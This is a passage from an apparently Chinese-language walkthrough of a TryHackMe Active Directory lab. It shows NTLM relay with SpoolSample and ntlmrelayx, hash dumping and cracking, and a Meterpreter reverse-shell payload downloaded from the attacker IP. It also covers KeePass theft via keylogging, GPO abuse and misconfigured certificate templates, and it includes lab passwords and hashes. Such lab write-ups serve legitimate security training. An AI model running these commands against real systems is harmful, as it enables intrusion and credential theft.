#ABB2BF">ComputerName thmserver2.za.tryhackme.loc</span></span></code></pre></div></div></figure><p>如果都获取不到结果，直接忽略他，靶机环境肯定是可以用的</p><h3 id="SMB-签名"><a href="#SMB-签名" class="headerlink" title="SMB 签名"></a>SMB 签名</h3><p>为了中继强制的身份验证尝试，<strong>不应该强制启用 SMB 签名</strong>。<strong>允许 SMB 签名</strong>和<strong>强制启用 SMB 签名</strong>是有区别的。由于一些遗留系统不支持 SMB 签名，默认情况下，SMB 的配置是<strong>允许但非强制签名</strong>，这意味着只有在双方都支持时才会使用。由于我们将托管一个恶意的 SMB 服务器，我们可以确保我们的服务器不支持签名，从而强制目标不签署 SMB 身份验证尝试。</p><p>参考文章：<a href="https://www.freebuf.com/articles/network/383408.html">https://www.freebuf.com/articles/network/383408.html</a></p><p>检查 SMB 强制签名是否打开可以用 nmap 扫描：</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">nmap</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--script=smb2-security-mode</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p445</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmserver1.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmserver2.za.tryhackme.loc</span></span></code></pre></div></div></figure><p>我们会用 <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> 实现这个认证中继攻击，强制 THMSERVER2 去向我们进行身份认证，再用 impacket 的 <code>ntlmrelayx.py</code> 中继到 THMSERVER1，这样我们就相当于有 THMSERVER2 的权限了（中继服务器把认证截获了，不是这台机器的 Shell 权限，指的是 THMSERVER2 访问 THMSERVER1 的权限）。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 执行命令</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;whoami /all&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 拿 Flag</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;powershell -c </span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">Get-Content C:/Users/Administrator.ZA/Desktop/flag3.txt</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 进 SMB 会话</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span><span class="line"><span style="color: #61AFEF">nc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11000</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># RDP 连接到机器</span></span><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:thmwrk1.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/d:za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:t2_melanie.davies</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:Pass123...</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/timeout:60000</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">C:\Tools\SpoolSample.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">THMSERVER2.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.50.57.85&quot;</span></span></code></pre></div></div></figure><p>同时可以提取用户的 Hash 去爆破</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Hashdump 要 10 分钟以上</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::</span></span><span class="line"><span style="color: #61AFEF">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><span class="line"><span style="color: #61AFEF">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><span class="line"><span style="color: #61AFEF">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::</span></span><span class="line"><span style="color: #61AFEF">vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::</span></span><span class="line"><span style="color: #61AFEF">trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 用 Hashcat 爆破密码</span></span><span class="line"><span style="color: #61AFEF">./hashcat.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hash.txt</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rockyou.txt</span></span><span class="line"><span style="color: #61AFEF">31d6cfe0d16ae931b73c59d7e0c089c0:</span></span><span class="line"><span style="color: #61AFEF">Approaching</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">final</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keyspace</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">-</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">workload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">adjusted.</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 破解出来 trevor.local 账户的密码 RDP 登不上去</span></span><span class="line"><span style="color: #61AFEF">43460d636f269c709b20049cee36ae7a:Password1@</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># SSH 也登不上去</span></span><span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">trevor.local@THMSERVER1.za.tryhackme.loc</span></span></code></pre></div></div></figure><h2 id="Exploiting-AD-Users"><a href="#Exploiting-AD-Users" class="headerlink" title="Exploiting AD Users"></a>Exploiting AD Users</h2><p>现在我们在工作站和服务器上有完整的管理权了，现在可以进行后渗透了。</p><p>这一节是从用户下手，收集用户的使用习惯</p><ul><li>凭证管理 - 用户如何存储其凭证。在 AD 中，这一点相当重要，因为用户可能有多套凭证，记住所有凭证可能会很麻烦，这一节会拿一个 KeePass 下手。</li><li>键盘记录和截屏</li></ul><h3 id="寻找密码管理器数据库"><a href="#寻找密码管理器数据库" class="headerlink" title="寻找密码管理器数据库"></a>寻找密码管理器数据库</h3><p>要找一个后缀是 <code>.kdbx</code> 的文件，这是 KeePass 的数据库文件，但是这个数据库被一个密码加密，我们还要找到这个密码。</p><p>这里用 Meterpreter 解决</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成小马</span></span><span class="line"><span style="color: #ABB2BF">msfvenom </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">p windows</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">x64</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">meterpreter</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">reverse_tcp LHOST</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">10.50</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">57.85</span><span style="color: #ABB2BF"> LPORT</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">-f</span><span style="color: #ABB2BF"> exe </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">o shell.ps1</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">msfconsole </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">q </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">x </span><span style="color: #98C379">&quot;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.85; set LPORT 4444; exploit&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 下载文件</span></span><span class="line"><span style="color: #56B6C2">certutil.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">urlcache -split </span><span style="color: #ABB2BF">-f</span><span style="color: #ABB2BF"> http:</span><span style="color: #56B6C2">//</span><span style="color: #D19A66">10.50</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">57.85</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">8081</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">shell.ps1</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># curl 下载</span></span><span class="line"><span style="color: #ABB2BF">wget </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">o </span><span style="color: #56B6C2">shell.exe</span><span style="color: #ABB2BF"> http:</span><span style="color: #56B6C2">//</span><span style="color: #D19A66">10.50</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">57.85</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">8081</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">shell.ps1</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 执行小马</span></span><span class="line"><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">shell.ps1</span></span></code></pre></div></div></figure><p>找 kdbx 文件：</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">meterpreter</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">search</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:/Users/&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">.kdbx</span></span><span class="line"><span style="color: #61AFEF">Found</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">6</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">results...</span></span><span class="line"><span style="color: #ABB2BF">==================</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Path</span><span style="color: #ABB2BF">                                                          </span><span style="color: #98C379">Size</span><span style="color: #ABB2BF"> (bytes)  Modified (</span><span style="color: #61AFEF">UTC</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #61AFEF">----</span><span style="color: #ABB2BF">                                                          </span><span style="color: #D19A66">------------</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">--------------</span></span><span class="line"><span style="color: #61AFEF">C:\Users\Administrator.ZA\Documents\PasswordDatabase.kdbx</span><span style="color: #ABB2BF">     </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span><span class="line"><span style="color: #61AFEF">C:\Users\Administrator.ZA\My</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Documents</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">asswordDatabase.kdbx</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span><span class="line"><span style="color: #61AFEF">C:\Users\t1_trevor.jones\Documents\PasswordDatabase.kdbx</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span><span class="line"><span style="color: #61AFEF">C:\Users\t1_trevor.jones\My</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Documents</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">asswordDatabase.kdbx</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span><span class="line"><span style="color: #61AFEF">C:\Users\trevor.local\Documents\PasswordDatabase.kdbx</span><span style="color: #ABB2BF">         </span><span style="color: #D19A66">2190</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-30</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #98C379">:36:02</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span><span class="line"><span style="color: #61AFEF">C:\Users\trevor.local\My</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Documents</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">asswordDatabase.kdbx</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">2190</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-30</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #98C379">:36:02</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 下载文件</span></span><span class="line"><span style="color: #61AFEF">download</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Users\Administrator.ZA\Documents\PasswordDatabase.kdbx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">admin.kdbx</span></span><span class="line"><span style="color: #61AFEF">download</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;c:\Users\trevor.local\Documents\PasswordDatabase.kdbx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">trevor.kdbx</span></span></code></pre></div></div></figure><h3 id="寻找密码管理器主密码"><a href="#寻找密码管理器主密码" class="headerlink" title="寻找密码管理器主密码"></a>寻找密码管理器主密码</h3><p>现在就是要抓到那个数据库的密码了。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用这个命令看用户是不是活跃</span></span><span class="line"><span style="color: #61AFEF">ps</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">grep</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;explorer&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 没回显就跟着下面做</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 进 shell</span></span><span class="line"><span style="color: #61AFEF">shell</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 改用户的密码</span></span><span class="line"><span style="color: #61AFEF">net</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">user</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">trevor.local</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Pass123...</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 登录 RDP</span></span><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:trevor.local</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:Pass123...</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/timeout:60000</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 Explorer 的 PID</span></span><span class="line"><span style="color: #61AFEF">ps</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">grep</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;explorer&quot;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 转移到用户的会话下面</span></span><span class="line"><span style="color: #61AFEF">migrate</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4360</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 抓用户输入</span></span><span class="line"><span style="color: #61AFEF">keyscan_start</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 过2分钟执行这个，就把输入抓出来了</span></span><span class="line"><span style="color: #61AFEF">keyscan_dump</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Dumping</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">captured</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keystrokes...</span></span><span class="line"><span style="color: #61AFEF">keep&lt;CR&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;Shift&gt;Imreallysurenoonewillguessmypassword&lt;CR&gt;</span></span></code></pre></div></div></figure><p>从这里下客户端：<a href="https://sourceforge.net/projects/keepass/files/KeePass%201.x/1.43/KeePass-1.43.zip/download">https://sourceforge.net/projects/keepass/files/KeePass%201.x/1.43/KeePass-1.43.zip/download</a></p><p>然后导入数据库，用抓到的密码解密，两个数据库我都帮你们看了，Administrator 用户是空的数据库，那个本地用户的数据库里有货。顺利拿到 flag 和一个 svcServMan 用户的密码。</p><img src="/thm_ad/image-20250805212143831.png" class="" title="image-20250805212143831"><h2 id="Exploiting-GPO"><a href="#Exploiting-GPO" class="headerlink" title="Exploiting GPO"></a>Exploiting GPO</h2><p>上一节拿到了 svcServMan 用户，我们就可以从这里下手，看看这个用户有什么用。</p><img src="/thm_ad/image-20250805213606577.png" class="" title="image-20250805213606577"><p>这个攻击路径非常清晰：</p><ul><li><p>初始权限：我们拥有一个账户，它对 MANAGEMENT SERVER PUSHES GPO 拥有 GenericWrite 权限。</p></li><li><p>攻击目标：这个 GPO 通过 GpLink 链接到了 MANAGEMENT SERVER OU。</p></li><li><p>最终受害者：MANAGEMENT SERVER OU 包含了机器 THMSERVER2.ZA.TRYHACKME.LOC。</p></li></ul><p>因此，我们可以利用 GenericWrite 权限修改 GPO 的内容，然后这个被修改的 GPO 会自动应用到 THMSERVER2 这台机器上，从而让我们控制这台主机。</p><h3 id="组策略对象（GPO）"><a href="#组策略对象（GPO）" class="headerlink" title="组策略对象（GPO）"></a>组策略对象（GPO）</h3><p>GPO 是一个包含各种策略设置的虚拟集合，每台 Windows 计算机都有一个本地策略配置，可设置防火墙、用户组、启动脚本和安全协议等。在大型组织中，为了集中管理这些设置，可以使用<strong>组策略管理（GPM）</strong>来在 Active Directory (AD) 结构上定义 GPO。</p><h3 id="GPO-的存储与应用"><a href="#GPO-的存储与应用" class="headerlink" title="GPO 的存储与应用"></a>GPO 的存储与应用</h3><p>所有 GPO 都以唯一的 GUID 名称存储在 AD 的 <strong>SYSVOL</strong> 目录下，并被复制到所有加入域的机器上。域内计算机每隔 15 分钟会自动从 SYSVOL 目录拉取 GPO 并应用相关策略。也可以通过手动运行 <code>gpupdate</code> 命令来立即应用。</p><h3 id="Exploiting-GPOs"><a href="#Exploiting-GPOs" class="headerlink" title="Exploiting GPOs"></a>Exploiting GPOs</h3><p>在本地管理员组和本地远程桌面用户组中添加一个我们控制的 AD 账户。这样，我们就能获得 THMSERVER2 的管理权限，并能 RDP 登录。</p><p>为了修改 GPO，我们需要以拥有相关权限的 AD 用户身份访问组策略管理。使用 runas 命令将 AD 用户的凭据注入内存，然后打开 MMC 修改 GPO。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">svcServMan</span><span style="color: #ABB2BF"> cmd.exe</span></span><span class="line"><span style="color: #ABB2BF">Sup3rStr0ngPass!@</span></span><span class="line"><span style="color: #ABB2BF"># 验证一下密码</span></span><span class="line"><span style="color: #E06C75">dir</span><span style="color: #ABB2BF"> \\za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">sysvol</span></span><span class="line"><span style="color: #ABB2BF"># 打开 MMC</span></span><span class="line"><span style="color: #ABB2BF">mmc</span></span></code></pre></div></div></figure><p>添加好管理单元然后展开，可以看到我们现在可以编辑这个 GPO。</p><img src="/thm_ad/image-20250805215149176.png" class="" title="image-20250805215149176"><p>把 IT Support 加入这个组就行。</p><img src="/thm_ad/image-20250805220109218.png" class="" title="image-20250805220109218"><p>等 15 分钟左右，让 GPO 生效，这下我们一开始加入 IT Support 组的用户就有对 THMSERVER2 的管理和 RDP 权限了。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:thmserver2.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/d:za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:barbara.reid</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:Password1</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/timeout:60000</span></span></code></pre></div></div></figure><h2 id="Exploiting-Certificates"><a href="#Exploiting-Certificates" class="headerlink" title="Exploiting Certificates"></a>Exploiting Certificates</h2><p>利用证书生成 TGT (Ticket Granting Ticket) 的机制，是 Kerberos 协议的一个扩展功能，称为 <strong>PKINIT</strong>（Public Key Cryptography for Initial Authentication in Kerberos）。</p><p>简单来说，PKINIT 允许客户端使用<strong>数字证书</strong>来替代传统的用户名和密码进行 Kerberos 的初始认证，也就是获取 TGT 的过程。</p><p>SpecterOps 所做的研究和<a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">发布的白皮书</a>显示，利用配置错误的证书模板进行权限升级和横向移动是可能的，主要讲的是用证书模板的一些参数，以下是示例：</p><ul><li><strong>Client Authentication</strong> - 证书可用于客户端身份验证。</li><li><strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> - 证书模板允许我们指定 Subject Alternative Name (SAN)。</li><li><strong>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY</strong> - 证书可与私钥一起导出。</li><li><strong>Certificate Permissions</strong> - 我们拥有使用此证书模板所需的权限。</li></ul><h3 id="利用证书模板"><a href="#利用证书模板" class="headerlink" title="利用证书模板"></a>利用证书模板</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 导出证书模板</span></span><span class="line"><span style="color: #61AFEF">certutil</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Template</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-v</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">templates.txt</span></span></code></pre></div></div></figure><p>[32] 号证书，我只保留了要关注的字段</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Template[32]:</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  TemplatePropPrivateKeyFlags = 1010010 (16842768)</span></span><span class="line"><span style="color: #abb2bf">    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)</span></span><span class="line"><span style="color: #abb2bf">  TemplatePropGeneralFlags = 20241 (131649)</span></span><span class="line"><span style="color: #abb2bf">    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1</span></span><span class="line"><span style="color: #abb2bf">    Allow EnrollZA\THMSERVER2$</span></span><span class="line"><span style="color: #abb2bf">    Allow Auto-EnrollZA\THMSERVER2$</span></span><span class="line"><span style="color: #abb2bf">    Allow ReadZA\THMSERVER2$</span></span></code></pre></div></div></figure><p><strong>安全漏洞点分析</strong></p><ol><li><code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code></li></ol><p>这个标志是整个攻击的核心。它允许<strong>申请者自行指定证书的主体名称</strong>。</p><ul><li><strong>安全风险</strong>: 正常的证书申请，CA 会从你的 AD 账户信息中自动填充你的名字。但这个标志绕过了这个安全机制。</li><li><strong>攻击利用</strong>: 攻击者可以利用这个点，在申请证书时将主体名称伪造成<strong>任何</strong>高权限用户（比如 <code>Administrator</code>），从而冒充他人身份。</li></ul><ol start="2"><li><code>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY</code></li></ol><p>这个标志使得私钥可以被导出。</p><ul><li><strong>安全风险</strong>: 私钥是证书的“密码”，它应该被安全地存储在设备上。如果私钥可以被导出，攻击者在获取证书后，就可以将私钥导出并保存在自己的攻击机上。</li><li><strong>攻击利用</strong>: 攻击者可以偷走私钥，并将其导入到自己的设备中。这样，即使目标系统上的证书被吊销，攻击者仍然可以继续使用这个私钥进行身份验证，实现<strong>持久化访问</strong>。</li></ul><ol start="3"><li><code>Allow Enroll</code> for <code>ZA\THMSERVER2$</code></li></ol><p>这个权限配置不当，是攻击的起点。</p><ul><li><strong>安全风险</strong>: <code>THMSERVER2$</code> 